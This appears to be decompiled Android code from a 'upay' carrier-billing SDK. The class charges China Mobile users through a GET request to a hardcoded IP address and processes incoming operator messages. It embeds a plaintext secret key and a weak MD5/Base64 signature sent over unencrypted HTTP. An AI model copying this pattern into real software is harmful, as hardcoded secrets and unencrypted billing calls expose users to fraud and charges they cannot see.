package com.upay.billing.engine.bj_rdo;

import android.annotation.SuppressLint;
import android.util.Base64;
import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.io.UnsupportedEncodingException;
import java.util.List;

public class Main
  extends CommonEngine
{
  private static final String TAG = "bjrdo--Main";
  public static final String bjRdoUrl = "http://118.26.235.115:8080/rdo/services/rdo/shortNotify?channel=$channel&feeCode=$feeCode&schannel=$schannel";
  public static final String channel = "qd1005";
  public static final String secretkey = "7788";
  
  public Main() {}
  
  public static String getBase64(String paramString)
  {
    String str = null;
    try
    {
      paramString = paramString.getBytes("utf-8");
      if (paramString != null) {
        str = Base64.encodeToString(paramString, 0);
      }
      return str;
    }
    catch (UnsupportedEncodingException paramString)
    {
      for (;;)
      {
        paramString.printStackTrace();
        paramString = null;
      }
    }
  }
  
  private String getSignStr()
  {
    return getBase64(Util.md5("qd10057788", false));
  }
  
  public Op getOp()
  {
    return Op.CMCC;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    return (paramOp == Op.CMCC) && (paramBoolean1) && (paramBoolean2);
  }
  
  @SuppressLint({"DefaultLocale"})
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Log.i("bjrdo--Main", "onMtAction: exec=" + paramJson.asObject() + ",mtNum=" + paramString1 + ",mtMsg=" + paramString2);
    switch (Main.2.$SwitchMap$com$upay$billing$engine$bj_rdo$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
    {
    default: 
      return 0;
    case 1: 
      return 524288;
    case 2: 
      return 65736;
    }
    return 0x10000 | paramJson.getInt("code");
  }
  
  public void pay(Trade paramTrade, List<Cmd> paramList)
  {
    Cmd localCmd = (Cmd)paramList.get(0);
    String str1 = paramTrade.getSubTrade(localCmd.key).getStr("sn");
    Json localJson = Json.createObject(new Object[] { "trade_id", paramTrade.id, "goods_key", paramTrade.goodsKey, "cmd_key", localCmd.key, "bt_key", this.key, "sn", str1, "response", "" });
    String str2 = getSignStr();
    String str3 = localCmd.msg;
    String str4 = Util.shortenSn(str1, true);
    String str5 = localCmd.num;
    Util.addTask(new Main.1(this, "http://118.26.235.115:8080/rdo/services/rdo/shortNotify?channel=$channel&feeCode=$feeCode&schannel=$schannel".replace("$channel", "qd1005").replace("$feeCode", str3).replace("$schannel", str4), str5, paramTrade, str1, paramList, localJson, localCmd).setDoGet().addHeader("clientHash", str2));
  }
}
